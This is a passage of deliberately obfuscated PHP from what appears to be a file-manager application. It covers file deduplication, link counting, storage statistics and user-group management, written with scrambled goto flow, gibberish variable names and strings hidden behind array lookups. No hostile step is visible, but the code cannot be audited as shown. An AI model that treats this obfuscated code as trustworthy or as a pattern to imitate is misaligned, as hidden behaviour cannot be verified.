$dÌ¸ÔÑÊ¬½ =& $_SERVER[¾÷]; if (!$c°¯±ºƒé) { return !1; } $c°¯±ºƒé[$dÌ¸ÔÑÊ¬½[87]] = intval($c°¯±ºƒé[$dÌ¸ÔÑÊ¬½[87]]); if (!$c°¯±ºƒé[$dÌ¸ÔÑÊ¬½[87]] && strlen($c°¯±ºƒé[$dÌ¸ÔÑÊ¬½[180]]) > 32) { $c°¯±ºƒé[$dÌ¸ÔÑÊ¬½[87]] = intval(substr($c°¯±ºƒé[$dÌ¸ÔÑÊ¬½[180]], 32)); } $aó„ÚãÉŒã = $this->add($c°¯±ºƒé); return $this->find($aó„ÚãÉŒã); } public function addFile($EÈï¤»³œµ, $cœŒÌğÂ„ä, $a´šÎæ°¾ƒ = false) { goto EòÔéÁ·Í©; E‚œ¥£ß…: $b¬¹õôÚ÷Â = $_SERVER[¾÷][1729] . $c›‹ëİÎ²Ú; CacheLock::lock($b¬¹õôÚ÷Â); if ($dÁğ•ì‡ÖÏ = $this->addFileCheckExist($b›ÃÎ˜æÖ, $c›‹ëİÎ²Ú, $d„Ê¥¯ˆ»Ÿ)) { CacheLock::unlock($b¬¹õôÚ÷Â); return $dÁğ•ì‡ÖÏ; } goto AŸƒ·ë»ì; EòÔéÁ·Í©: $b›ÃÎ˜æÖ = IO::hashSimple($EÈï¤»³œµ); $c›‹ëİÎ²Ú = IO::hashMd5($EÈï¤»³œµ); $d„Ê¥¯ˆ»Ÿ = IO::size($EÈï¤»³œµ); goto E‚œ¥£ß…; fØ‹¡‡ö¬: return $d”˜ ¾î¼; goto D™ĞÓÌÉ; AŸƒ·ë»ì: $aÆ¼õÓõ’¥ = $this->addFileMake($EÈï¤»³œµ, $d„Ê¥¯ˆ»Ÿ, $b›ÃÎ˜æÖ, $c›‹ëİÎ²Ú, $cœŒÌğÂ„ä, $a´šÎæ°¾ƒ); $d”˜ ¾î¼ = $this->addFileData($aÆ¼õÓõ’¥); CacheLock::unlock($b¬¹õôÚ÷Â); goto fØ‹¡‡ö¬; D™ĞÓÌÉ: } public function addFileMake($A¸°‘ŒÖ´, $d§àêßÁ÷–, $bªò›‹èÓ•, $AÂ¬ÕÇÏ²é, $DøÈÉ½Ê…§, $CÓÎ×ê—ÃÎ) { goto B­‡± Ô²­; B­‡± Ô²­: $d»ÛÍÅï® =& $_SERVER[¾÷]; $C‘–‰ °« = $this->createFileName($DøÈÉ½Ê…§, $bªò›‹èÓ•, $AÂ¬ÕÇÏ²é); $cÑŒ’„öµ‰ = get_path_father($C‘–‰ °«); goto E‘¿Œˆ²³; Cï¤±î¼ĞÃ: $a–Šéà´ñ¶ = KodIO::defaultDriver(); $Eª–öÌè»İ = array($d»ÛÍÅï®[552] => $d§àêßÁ÷–, $d»ÛÍÅï®[1726] => 1, $d»ÛÍÅï®[416] => $DøÈÉ½Ê…§, $d»ÛÍÅï®[761] => $a–Šéà´ñ¶[$d»ÛÍÅï®[397]], $d»ÛÍÅï®[417] => $C‘–‰ °«, $d»ÛÍÅï®[1727] => $bªò›‹èÓ•, $d»ÛÍÅï®[1728] => $AÂ¬ÕÇÏ²é); return $Eª–öÌè»İ; goto DİªÄæÎÈ¹; E‘¿Œˆ²³: $EçôåÅÓ  = get_path_this($C‘–‰ °«); if ($CÓÎ×ê—ÃÎ) { $Eî­‡½½å­ = IO::move($A¸°‘ŒÖ´, $cÑŒ’„öµ‰, !1, $EçôåÅÓ ); } else { $Eî­‡½½å­ = IO::copy($A¸°‘ŒÖ´, $cÑŒ’„öµ‰, !1, $EçôåÅÓ ); } if (!$Eî­‡½½å­) { return !1; } goto Cï¤±î¼ĞÃ; DİªÄæÎÈ¹: } public function addFileCheckExist($c²Ì«…ÙŠ”, $Aİî‰¥¸÷®, $Eˆ“áØ¤‰) { $A¹¯Õ‹…÷« =& $_SERVER[¾÷]; $aŠ ŞŒæß = $this->findByHash($c²Ì«…ÙŠ”, $Aİî‰¥¸÷®); if (!$aŠ ŞŒæß) { return !1; } $D›÷×¸£òÙ = array($A¹¯Õ‹…÷«[1726] => intval($aŠ ŞŒæß[$A¹¯Õ‹…÷«[1730]]) + 1, $A¹¯Õ‹…÷«[552] => $Eˆ“áØ¤‰); $this->where(array($A¹¯Õ‹…÷«[451] => $aŠ ŞŒæß[$A¹¯Õ‹…÷«[450]]))->save($D›÷×¸£òÙ); return $aŠ ŞŒæß; } public function remove($C‹ò™Ü˜¹£) { $this->linkCountChange($C‹ò™Ü˜¹£, !1); $this->clearEmpty(); return !0; } public function linkAdd($C•¢‚ê–àÛ) { $this->linkCountChange($C•¢‚ê–àÛ, !0); } public function linkCountChange($CÇŸÙ‘¢õ, $bˆéøŒŒ‰´) { goto e»ô÷§”íÃ; DÍ„Ï¶®•®: $c‘âÇãİ‘á = array(); foreach ($CÇŸÙ‘¢õ as $cö„ªÙÃæ”) { $dö ½ÎÕù = $cö„ªÙÃæ” . $bö£à‰¶í–[43]; if (!$c‘âÇãİ‘á[$dö ½ÎÕù]) { $c‘âÇãİ‘á[$dö ½ÎÕù] = 0; } $c‘âÇãİ‘á[$dö ½ÎÕù]++; } $aƒµ²–°¨³ = array(); goto aŠîš¡ùŸ÷; e»ô÷§”íÃ: $bö£à‰¶í– =& $_SERVER[¾÷]; if (!$CÇŸÙ‘¢õ) { return; } if (!is_array($CÇŸÙ‘¢õ)) { $CÇŸÙ‘¢õ = array($CÇŸÙ‘¢õ); } goto DÍ„Ï¶®•®; aŠîš¡ùŸ÷: foreach ($c‘âÇãİ‘á as $cö„ªÙÃæ” => $Eğ¨¸‘À¹¥) { $dö ½ÎÕù = $Eğ¨¸‘À¹¥ . $bö£à‰¶í–[43]; if (!$aƒµ²–°¨³[$dö ½ÎÕù]) { $aƒµ²–°¨³[$dö ½ÎÕù] = array(); } $aƒµ²–°¨³[$dö ½ÎÕù][] = $cö„ªÙÃæ”; } foreach ($aƒµ²–°¨³ as $Eğ¨¸‘À¹¥ => $fòÃäÃ¸¯‘) { if (!$fòÃäÃ¸¯‘) { continue; } $Eğ¨¸‘À¹¥ = $bˆéøŒŒ‰´ ? $Eğ¨¸‘À¹¥ : -intval($Eğ¨¸‘À¹¥); $FÖàßÕÄ³ = array($bö£à‰¶í–[450] => array($bö£à‰¶í–[17], $fòÃäÃ¸¯‘)); if ($Eğ¨¸‘À¹¥ < 0) { $FÖàßÕÄ³[$bö£à‰¶í–[1730]] = array($bö£à‰¶í–[949], abs($Eğ¨¸‘À¹¥)); } $this->where($FÖàßÕÄ³)->setAdd($bö£à‰¶í–[1730], $Eğ¨¸‘À¹¥); } goto b¦¸Ùîã³¹; b¦¸Ùîã³¹: } public function findByHash($A‚Ûä•áî, $D« ‹ß‰†‹ = false) { $BØ¼ñ×ÕÁÏ =& $_SERVER[¾÷]; if (!$A‚Ûä•áî && !$D« ‹ß‰†‹) { return !1; } $F§ÚÊóßŸø = array($BØ¼ñ×ÕÁÏ[1727] => $A‚Ûä•áî); if ($D« ‹ß‰†‹) { $F§ÚÊóßŸø = array($BØ¼ñ×ÕÁÏ[1728] => $D« ‹ß‰†‹); } return $this->order($BØ¼ñ×ÕÁÏ[1731])->where($F§ÚÊóßŸø)->find(); } public function clearEmpty($fõï™óàÙ = 0) { goto D°¿¨¥ëˆ; eË¾ËÉ‘‹š: foreach ($DÑÒøŞË as $FŠƒ„ƒòÆœ) { $d‚îÔ™Ü¡->update(1); $this->resetFile($FŠƒ„ƒòÆœ); } $d‚îÔ™Ü¡->end(); goto A±°¸ç©÷ã; D°¿¨¥ëˆ: $eÊ…Ç²ìë =& $_SERVER[¾÷]; $E‚–×šäùï = time() - 3600 * 24 * $fõï™óàÙ; $D‡Ëå½…Ç« = $eÊ…Ç²ìë[1732] . $E‚–×šäùï; goto BÖœù Ø; BÖœù Ø: $DÑÒøŞË = $this->where($D‡Ëå½…Ç«)->select(); if (!$DÑÒøŞË) { return; } $d‚îÔ™Ü¡ = new Task($eÊ…Ç²ìë[1733], $eÊ…Ç²ìë[43], count($DÑÒøŞË)); goto eË¾ËÉ‘‹š; A±°¸ç©÷ã: } public function resetFile($eöïÀàŸ¬) { goto AØø‰õùàæ; AØø‰õùàæ: $aÈÊĞÉ¤šé =& $_SERVER[¾÷]; $B—˜Ü²”Öó = array($aÈÊĞÉ¤šé[451] => $eöïÀàŸ¬[$aÈÊĞÉ¤šé[450]]); $Fï°ùóö‡é = Model($aÈÊĞÉ¤šé[1180])->where($B—˜Ü²”Öó)->count(); goto a¢±Óâ¢ƒ; a¢±Óâ¢ƒ: $A´Ïª²…†‘ = Model($aÈÊĞÉ¤šé[1734])->where($B—˜Ü²”Öó)->count(); $e­§è‡“Èô = intval($Fï°ùóö‡é) + intval($A´Ïª²…†‘); if ($e­§è‡“Èô == 0) { IO::remove($eöïÀàŸ¬[$aÈÊĞÉ¤šé[85]]); $this->where($B—˜Ü²”Öó)->delete(); $this->metaSet($eöïÀàŸ¬[$aÈÊĞÉ¤šé[450]], null, null); return; } goto F°™ÎÑöÃ; F°™ÎÑöÃ: if ($eöïÀàŸ¬[$aÈÊĞÉ¤šé[1730]] != $e­§è‡“Èô) { $this->where($B—˜Ü²”Öó)->save(array($aÈÊĞÉ¤šé[1726] => $e­§è‡“Èô)); } goto FÙËÃÜÖŒ‚; FÙËÃÜÖŒ‚: } public function storageInfo($E³ÔÄùÜ©Ô = false) { goto e¾áâ„É; e¾áâ„É: $dË¢ÌˆÀáŠ =& $_SERVER[¾÷]; $B‹ùÑ”¶°¯ = $this->count() + 0.0; $fÈ¢öè‡É© = 0; goto BâÉƒá•´; BâÉƒá•´: $E‡‘‡Üé¾ = 1; $F²äë“¤å« = 0; $aæöñœğ¬Ù = 5000; goto BÃé‘¬ÓÎõ; BÃé‘¬ÓÎõ: for ($eÆÏÜ”¹è• = 0; $eÆÏÜ”¹è• < $B‹ùÑ”¶°¯; $eÆÏÜ”¹è• = $eÆÏÜ”¹è• + $aæöñœğ¬Ù) { $f‰ìŒ¦×ó× = $this->limit($eÆÏÜ”¹è•, $eÆÏÜ”¹è• + $aæöñœğ¬Ù)->select(); foreach ($f‰ìŒ¦×ó× as $Bã¾¥Ô›é«) { $E‡‘‡Üé¾ += $Bã¾¥Ô›é«[$dË¢ÌˆÀáŠ[87]] * $Bã¾¥Ô›é«[$dË¢ÌˆÀáŠ[1730]]; $fÈ¢öè‡É© += $Bã¾¥Ô›é«[$dË¢ÌˆÀáŠ[87]] * ($Bã¾¥Ô›é«[$dË¢ÌˆÀáŠ[1730]] - 1); $F²äë“¤å« += $Bã¾¥Ô›é«[$dË¢ÌˆÀáŠ[1730]]; } } $dÌæ†Äí‹ = array($dË¢ÌˆÀáŠ[1735] => $E‡‘‡Üé¾, $dË¢ÌˆÀáŠ[1736] => $fÈ¢öè‡É©, $dË¢ÌˆÀáŠ[1737] => $fÈ¢öè‡É© / $E‡‘‡Üé¾, $dË¢ÌˆÀáŠ[91] => $B‹ùÑ”¶°¯, $dË¢ÌˆÀáŠ[1738] => $F²äë“¤å«); return $dÌæ†Äí‹; goto A”ÀñÑÉÎ; A”ÀñÑÉÎ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\145" => "\x67\x72\x6f\x75\160\137\155\x65\x74\141", "\x6d\145\x74\141\x46\151\x65\x6c\144" => "\147\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($f¥…´¹) { $f§šŒÎö¨ =& $_SERVER[¾÷]; return array($f§šŒÎö¨[1739] => array($f¥…´¹[0], $f§šŒÎö¨[1740]), $f§šŒÎö¨[1741] => array($f¥…´¹[0], $f§šŒÎö¨[1740])); } protected function getInfo($a¡’Ñ¬Â…ß) { $f®çÛ´¾„â = $this->getInfoSimple($a¡’Ñ¬Â…ß); if (!$f®çÛ´¾„â) { return !1; } return $this->_listDataApplyItem($f®çÛ´¾„â); } protected function getInfoSimple($dÁ¸¸Õ‚ «, $aŞ…ˆïìÓŠ = false) { $dŞé†œÒª =& $_SERVER[¾÷]; if ($aŞ…ˆïìÓŠ) { $a İÑíø¸Á = array($dŞé†œÒª[1668] => intval($dÁ¸¸Õ‚ «)); $d–òªòÔÂ¥ = $this->where($a İÑíø¸Á)->find(); return is_array($d–òªòÔÂ¥) ? $d–òªòÔÂ¥ : array(); } return $this->cacheFunctionGet($dŞé†œÒª[1742], $dÁ¸¸Õ‚ «); } protected function groupAdd($FÜŒšĞÉ¹) { goto F³ä„ƒ°¹œ; f‹Øîà§ğ: if ($A‚±«ã³ì®[$BÆëë‡î¼•[490]]) { $b³É¡¾í¬ö = $A‚±«ã³ì®[$BÆëë‡î¼•[490]] . $A‚±«ã³ì®[$BÆëë‡î¼•[1668]] . $BÆëë‡î¼•[57]; } $BêÕäÖÂÀÒ = array($BÆëë‡î¼•[416] => $this->groupNameAuto($FÜŒšĞÉ¹[$BÆëë‡î¼•[481]], $FÜŒšĞÉ¹[$BÆëë‡î¼•[38]]), $BÆëë‡î¼•[398] => $FÜŒšĞÉ¹[$BÆëë‡î¼•[481]], $BÆëë‡î¼•[557] => $b³É¡¾í¬ö, $BÆëë‡î¼•[1743] => $FÜŒšĞÉ¹[$BÆëë‡î¼•[1652]], $BÆëë‡î¼•[1744] => 0, $BÆëë‡î¼•[1672] => 0); if (isset($FÜŒšĞÉ¹[$BÆëë‡î¼•[1691]])) { $BêÕäÖÂÀÒ[$BÆëë‡î¼•[1691]] = $FÜŒšĞÉ¹[$BÆëë‡î¼•[1691]]; } else { $D™™Õàº• = $this->max($BÆëë‡î¼•[1691]); if (!$D™™Õàº•) { $D™™Õàº• = 0; } $BêÕäÖÂÀÒ[$BÆëë‡î¼•[1691]] = $D™™Õàº• + 1; } goto a‘Ò½ß‡¦; a‘Ò½ß‡¦: if (!empty($FÜŒšĞÉ¹[$BÆëë‡î¼•[1668]])) { $BêÕäÖÂÀÒ[$BÆëë‡î¼•[1668]] = $FÜŒšĞÉ¹[$BÆëë‡î¼•[1668]]; } $c¿èì»±Úç = $this->add($BêÕäÖÂÀÒ); $this->setNamePinyin($c¿èì»±Úç, $BêÕäÖÂÀÒ[$BÆëë‡î¼•[38]]); goto fŠÖ¯ğƒ”‡; fŠÖ¯ğƒ”‡: if (isset($FÜŒšĞÉ¹[$BÆëë‡î¼•[1745]])) { $this->metaSet($c¿èì»±Úç, array($BÆëë‡î¼•[1745] => $FÜŒšĞÉ¹[$BÆëë‡î¼•[1745]], $BÆëë‡î¼•[1746] => $FÜŒšĞÉ¹[$BÆëë‡î¼•[1746]])); unset($FÜŒšĞÉ¹[$BÆëë‡î¼•[1745]]); unset($FÜŒšĞÉ¹[$BÆëë‡î¼•[1746]]); } Model($BÆëë‡î¼•[1180])->groupRootAdd($c¿èì»±Úç); return $c¿èì»±Úç; goto ağêÄñ«Òš; F³ä„ƒ°¹œ: $BÆëë‡î¼• =& $_SERVER[¾÷]; if (!$FÜŒšĞÉ¹[$BÆëë‡î¼•[481]] && isset($FÜŒšĞÉ¹[$BÆëë‡î¼•[1668]]) && $FÜŒšĞÉ¹[$BÆëë‡î¼•[1668]] == 1) { if ($A‚±«ã³ì® = $this->getInfoSimple($FÜŒšĞÉ¹[$BÆëë‡î¼•[1668]], !0)) { return $FÜŒšĞÉ¹[$BÆëë‡î¼•[1668]]; } } else { $A‚±«ã³ì® = $this->getInfoSimple($FÜŒšĞÉ¹[$BÆëë‡î¼•[481]]); if (!$A‚±«ã³ì®) { return !1; } } $b³É¡¾í¬ö = $BÆëë‡î¼•[502]; goto f‹Øîà§ğ; ağêÄñ«Òš: } protected function groupEdit($F‚¼×Ö˜˜ã, $fŒ¾ô’¾Ê…) { goto A–õ¦çÜß±; a…Š…‰Ç“¥: if (isset($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[38]]) && $fŒ¾ô’¾Ê…[$FÊù©è¸°‚[38]] != $F¡¼©ˆ¸¤[$FÊù©è¸°‚[38]]) { $this->_clearChildrenCache($F¡¼©ˆ¸¤); } return $this->where(array($FÊù©è¸°‚[1747] => $F‚¼×Ö˜˜ã))->save($fŒ¾ô’¾Ê…); goto a…¢˜‘ºÏ; b‡àè¼×¸–: if (!empty($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[481]])) { $BØ°¨Œñ¨© = $this->getInfoSimple($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[481]]); if (!$BØ°¨Œñ¨©) { return !1; } if ($F¡¼©ˆ¸¤[$FÊù©è¸°‚[1668]] == $BØ°¨Œñ¨©[$FÊù©è¸°‚[1668]]) { return !1; } if ($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[481]] != $F¡¼©ˆ¸¤[$FÊù©è¸°‚[481]]) { if ($BØ°¨Œñ¨©[$FÊù©è¸°‚[490]] !== $F¡¼©ˆ¸¤[$FÊù©è¸°‚[490]] && strpos($BØ°¨Œñ¨©[$FÊù©è¸°‚[490]], $F¡¼©ˆ¸¤[$FÊù©è¸°‚[490]] . $F¡¼©ˆ¸¤[$FÊù©è¸°‚[1668]] . $FÊù©è¸°‚[57]) === 0) { return !1; } $fŒ¾ô’¾Ê…[$FÊù©è¸°‚[557]] = $BØ°¨Œñ¨©[$FÊù©è¸°‚[490]] . $fŒ¾ô’¾Ê…[$FÊù©è¸°‚[481]] . $FÊù©è¸°‚[57]; $this->_changeChildLevel($F¡¼©ˆ¸¤, $BØ°¨Œñ¨©); } } if (isset($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[38]])) { $this->setNamePinyin($F‚¼×Ö˜˜ã, $fŒ¾ô’¾Ê…[$FÊù©è¸°‚[38]]); } if (isset($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[1745]])) { $this->metaSet($F‚¼×Ö˜˜ã, array($FÊù©è¸°‚[1745] => $fŒ¾ô’¾Ê…[$FÊù©è¸°‚[1745]], $FÊù©è¸°‚[1746] => $fŒ¾ô’¾Ê…[$FÊù©è¸°‚[1746]])); unset($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[1745]]); unset($fŒ¾ô’¾Ê…[$FÊù©è¸°‚[1746]]); } goto a…Š…‰Ç“¥; A–õ¦çÜß±: $FÊù©è¸°‚ =& $_SERVER[¾÷]; $F¡¼©ˆ¸¤ = $this->getInfoSimple($F‚¼×Ö˜˜ã); if (!$F¡¼©ˆ¸¤) { return !1; } goto b‡àè¼×¸–; a…¢˜‘ºÏ: } private function _clearChildrenCache($Dê·©‘Ö×) { $c•¸Îç‚™ =& $_SERVER[¾÷]; $fáİŒÕ½˜ê = array($c•¸Îç‚™[557] => array($c•¸Îç‚™[516], $Dê·©‘Ö×[$c•¸Îç‚™[490]] . $Dê·©‘Ö×[$c•¸Îç‚™[1668]] . $c•¸Îç‚™[517])); $eæ¹Ó†² = $this->field($c•¸Îç‚™[1668])->where($fáİŒÕ½˜ê)->select(); foreach ($eæ¹Ó†² as $b‰ºæˆ©íÌ) { $this->cacheFunctionClear($c•¸Îç‚™[1748], $b‰ºæˆ©íÌ[$c•¸Îç‚™[1668]]); $this->cacheFunctionClear($c•¸Îç‚™[1742], $b‰ºæˆ©íÌ[$c•¸Îç‚™[1668]]); } } private function _changeChildLevel($CØ«ò¼»Œæ, $cÂÅà×ç»è, $Eæ°Ìß§ñ‘ = false) { goto BÂÛêëÂÊ²; B¤‡ÁÌ¨: $this->_clearChildrenCache($CØ«ò¼»Œæ); $this->where($b«Àù›ø¿ß)->data($A¸½ÔšÓÂ)->save(); goto CÀæäáªóğ; BÂÛêëÂÊ²: $D»œ‚§„¼ =& $_SERVER[¾÷]; $Fø¨ƒ†ö¯ = $CØ«ò¼»Œæ[$D»œ‚§„¼[490]] . $CØ«ò¼»Œæ[$D»œ‚§„¼[1668]] . $D»œ‚§„¼[57]; $dÊ¤ª£¨¹ = $cÂÅà×ç»è[$D»œ‚§„¼[490]] . $cÂÅà×ç»è[$D»œ‚§„¼[1668]] . $D»œ‚§„¼[57] . $CØ«ò¼»Œæ[$D»œ‚§„¼[1668]] . $D»œ‚§„¼[57]; goto Eö³ İæ„Û; Eö³ İæ„Û: if ($Eæ°Ìß§ñ‘) { $dÊ¤ª£¨¹ = $cÂÅà×ç»è[$D»œ‚§„¼[490]] . $cÂÅà×ç»è[$D»œ‚§„¼[1668]] . $D»œ‚§„¼[57]; } $b«Àù›ø¿ß = array($D»œ‚§„¼[557] => array($D»œ‚§„¼[516], $CØ«ò¼»Œæ[$D»œ‚§„¼[490]] . $CØ«ò¼»Œæ[$D»œ‚§„¼[1668]] . $D»œ‚§„¼[517])); $A¸½ÔšÓÂ = array($D»œ‚§„¼[557] => array($D»œ‚§„¼[565], "\x72\145\x70\154\x61\143\x65\x28\x70\141\162\145\x6e\164\114\145\166\x65\x6c\x2c\x27{$Fø¨ƒ†ö¯}\47\x2c\47{$dÊ¤ª£¨¹}\x27\x29")); goto B¤‡ÁÌ¨; CÀæäáªóğ: } public function setNamePinyin($F¬´Ã˜Û³×, $BË¦ä«Æ‰ = false) { $D¶…ğ¾Š° =& $_SERVER[¾÷]; if (!$BË¦ä«Æ‰) { $d­îÍóÕÜ = $this->getInfoSimple($F¬´Ã˜Û³×); $BË¦ä«Æ‰ = $d­îÍóÕÜ[$D¶…ğ¾Š°[38]]; } if (!Input::check($BË¦ä«Æ‰, $D¶…ğ¾Š°[560])) { $this->metaSet($F¬´Ã˜Û³×, $D¶…ğ¾Š°[447], null); $this->metaSet($F¬´Ã˜Û³×, $D¶…ğ¾Š°[446], null); return; } $dÔÃãÀ¬‰Ñ = array($D¶…ğ¾Š°[447] => str_replace($D¶…ğ¾Š°[60], $D¶…ğ¾Š°[43], Pinyin::encode($BË¦ä«Æ‰)), $D¶…ğ¾Š°[446] => Pinyin::encode($BË¦ä«Æ‰, $D¶…ğ¾Š°[561])); $this->metaSet($F¬´Ã˜Û³×, $dÔÃãÀ¬‰Ñ); } protected function groupStatus($e¾¸¼…Ğ , $DÓš¡ÈÃ) { goto Cˆªª†ì‡; aš­ìƒŠ: if ($DÓš¡ÈÃ == $cÓÑâÈ¾õ[96]) { $EÒÌ¬“‚³ = $this->parentLevelArray($Dñ¬‹ã™í[$cÓÑâÈ¾õ[490]]); } else { $fÅ°ÑŞ‚±É = array($cÓÑâÈ¾õ[557] => array($cÓÑâÈ¾õ[516], $Dñ¬‹ã™í[$cÓÑâÈ¾õ[490]] . $Dñ¬‹ã™í[$cÓÑâÈ¾õ[1668]] . $cÓÑâÈ¾õ[517])); $EÒÌ¬“‚³ = $this->where($fÅ°ÑŞ‚±É)->field($cÓÑâÈ¾õ[1668])->select(); $EÒÌ¬“‚³ = array_to_keyvalue($EÒÌ¬“‚³, $cÓÑâÈ¾õ[43], $cÓÑâÈ¾õ[1668]); } $EÒÌ¬“‚³[] = $Dñ¬‹ã™í[$cÓÑâÈ¾õ[1668]]; $F¨’˜§Ô = array(); goto bª¥›»…·ß; Cˆªª†ì‡: $cÓÑâÈ¾õ =& $_SERVER[¾÷]; $Dñ¬‹ã™í = $this->getInfoSimple($e¾¸¼…Ğ ); if (!$Dñ¬‹ã™í) { return !1; } goto aš­ìƒŠ; bª¥›»…·ß: foreach ($EÒÌ¬“‚³ as $e¾¸¼…Ğ ) { $F¨’˜§Ô[] = array($cÓÑâÈ¾õ[1668] => $e¾¸¼…Ğ , $cÓÑâÈ¾õ[102] => $cÓÑâÈ¾õ[711], $cÓÑâÈ¾õ[379] => $DÓš¡ÈÃ); } return Model($cÓÑâÈ¾õ[1749])->addAll($F¨’˜§Ô, array(), !0); goto F™óÅ‚‰îœ; F™óÅ‚‰îœ: } protected function groupRemove($C‡÷ôùÓÇ) { goto DÛ®±áÙù¡; C«ŸŠ”‰Ç: Model($DëÇô£‰’[776])->groupRootRemove($C‡÷ôùÓÇ); return $this->where($b¿—ß‰Œã©)->delete(); goto A±œÍ‚â§ˆ; FæŞÍŞ«Ùª: if (!$a˜Òšáø„© || $a˜Òšáø„©[$DëÇô£‰’[481]] == 0) { return !1; } $CÆ¶ŒğÖÂ = $this->getInfoSimple($a˜Òšáø„©[$DëÇô£‰’[481]]); $this->_changeChildLevel($a˜Òšáø„©, $CÆ¶ŒğÖÂ, !0); goto cÔÉ–ˆ¹; cÔÉ–ˆ¹: $this->where(array($DëÇô£‰’[481] => $C‡÷ôùÓÇ))->save(array($DëÇô£‰’[481] => $a˜Òšáø„©[$DëÇô£‰’[481]])); Model($DëÇô£‰’[1749])->where($b¿—ß‰Œã©)->delete(); Model($DëÇô£‰’[1750])->where($b¿—ß‰Œã©)->delete(); goto C«ŸŠ”‰Ç; DÛ®±áÙù¡: $DëÇô£‰’ =& $_SERVER[¾÷]; $b¿—ß‰Œã© = array($DëÇô£‰’[1668] => $C‡÷ôùÓÇ); $a˜Òšáø„© = $this->where($b¿—ß‰Œã©)->find(); goto FæŞÍŞ«Ùª; A±œÍ‚â§ˆ: } protected function groupSort($aëãªëÀÈ…) { $cß‹–ë×‡ª =& $_SERVER[¾÷]; $B÷«‹½çƒÖ = array(); foreach ($aëãªëÀÈ… as $bêÄªÀà¾ => $C³£„…±Å) { $B÷«‹½çƒÖ[] = array($cß‹–ë×‡ª[1668], $C³£„…±Å, $cß‹–ë×‡ª[1691], $bêÄªÀà¾ + 1); } $this->saveAll($B÷«‹½çƒÖ); } public function listData() { $cäğøğŞ² = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cäğøğŞ²[$_SERVER[¾÷][374]]); return $cäğøğŞ²; } private function _makeOrder($b©ÖçÎŠ¸Œ = '') { goto bêİ®õƒ¤; bóµª©–: $fæ†Ê’ø¸ = Input::get($AÓƒŞÒñ×½[438], $AÓƒŞÒñ×½[17], $AÓƒŞÒñ×½[1672], $bß‹Æ¼¨Ğ); $D×æÖ–å¾ = Input::get($AÓƒŞÒñ×½[439], $AÓƒŞÒñ×½[17], $AÓƒŞÒñ×½[1751], array($AÓƒŞÒñ×½[1751], $AÓƒŞÒñ×½[433])); $D×æÖ–å¾ = $CóºİÕ„°ß[$D×æÖ–å¾]; goto F™…ô„¸½·; bêİ®õƒ¤: $AÓƒŞÒñ×½ =& $_SERVER[¾÷]; $bß‹Æ¼¨Ğ = array($AÓƒŞÒñ×½[1668], $AÓƒŞÒñ×½[38], $AÓƒŞÒñ×½[1654], $AÓƒŞÒñ×½[202]); $CóºİÕ„°ß = array($AÓƒŞÒñ×½[431] => $AÓƒŞÒñ×½[432], $AÓƒŞÒñ×½[433] => $AÓƒŞÒñ×½[434]); goto bóµª©–; F™…ô„¸½·: $b©ÖçÎŠ¸Œ = $b©ÖçÎŠ¸Œ . "{$fæ†Ê’ø¸}\40{$D×æÖ–å¾}\x2c\x20\x67\162\157\165\x70\x49\104\40\141\163\143"; return $this->order($b©ÖçÎŠ¸Œ); goto FÎ¼—×Åô£; FÎ¼—×Åô£: } public function listChild($EéÈ£¼¹•) { $DŠºØÀ‹ª =& $_SERVER[¾÷]; $DÄ»õçÎ« = $this->where(array($DŠºØÀ‹ª[481] => $EéÈ£¼¹•))->_makeOrder()->selectPage(200); $this->_listDataApply($DÄ»õçÎ«[$DŠºØÀ‹ª[374]]); return $DÄ»õçÎ«; } public function listByID($e‰¢‘Ä£®) { $Cçå–»Æ =& $_SERVER[¾÷]; if (!$e‰¢‘Ä£®) { return array(); } $aÙŸ•†µÎÕ = array($Cçå–»Æ[1668] => array($Cçå–»Æ[17], $e‰¢‘Ä£®)); $eÎ¬¸¤ÉÑø = $this->where($aÙŸ•†µÎÕ)->select(); $this->_listDataApply($eÎ¬¸¤ÉÑø); return $eÎ¬¸¤ÉÑø; } public function listSearch($eÄìÃ›„š¼) { goto E·ÏÉä¾Î«; E¿ëÓÉï±Ü: if (!trim($AÀšâŠÇÂ´)) { return !1; } $AÀšâŠÇÂ´ = str_replace($DªÛ ëöµ»[1754], $DªÛ ëöµ»[1755], $AÀšâŠÇÂ´); $Fà‹ŞÍ±Î = array($DªÛ ëöµ»[1668] => array($DªÛ ëöµ»[387], "{$AÀšâŠÇÂ´}\45"), $DªÛ ëöµ»[38] => array($DªÛ ëöµ»[387], "\45{$AÀšâŠÇÂ´}\45"), $DªÛ ëöµ»[934] => $DªÛ ëöµ»[1756]); goto A³àñŒÍİ ; Aß‡ƒ›ˆÑá: $EÖ¤¹»’Ò£ = $EÖ¤¹»’Ò£ ? $EÖ¤¹»’Ò£ : array(); if (!$EÖ¤¹»’Ò£ || count($EÖ¤¹»’Ò£[$DªÛ ëöµ»[374]]) < 5 && Input::check($AÀšâŠÇÂ´, $DªÛ ëöµ»[323])) { goto F×†¶İµŠ×; F×†¶İµŠ×: $DŸ©êî‹Ç = $this->groupChildrenAll($eÑØŒ‘´íÒ); $f¸®ã’‘ÔÁ = $this->_searchFromMeta($DªÛ ëöµ»[446], $AÀšâŠÇÂ´, 10, $DŸ©êî‹Ç); $bª…¦‚Šœ = $this->_searchFromMeta($DªÛ ëöµ»[447], $AÀšâŠÇÂ´, 10, $DŸ©êî‹Ç); goto eîù›Á¨ ¨; a¥Œ‚‘ÆÅ: $EÖ¤¹»’Ò£[$DªÛ ëöµ»[371]][$DªÛ ëöµ»[373]] = ceil($EÖ¤¹»’Ò£[$DªÛ ëöµ»[371]][$DªÛ ëöµ»[372]] / $EÖ¤¹»’Ò£[$DªÛ ëöµ»[371]][$DªÛ ëöµ»[368]]); goto F¨±„ê‡‹‹; eîù›Á¨ ¨: $A°­Ãµ = array_merge($f¸®ã’‘ÔÁ, $bª…¦‚Šœ, $EÖ¤¹»’Ò£[$DªÛ ëöµ»[374]]); $EÖ¤¹»’Ò£[$DªÛ ëöµ»[374]] = array_unique_by_key($A°­Ãµ, $DªÛ ëöµ»[1668]); $EÖ¤¹»’Ò£[$DªÛ 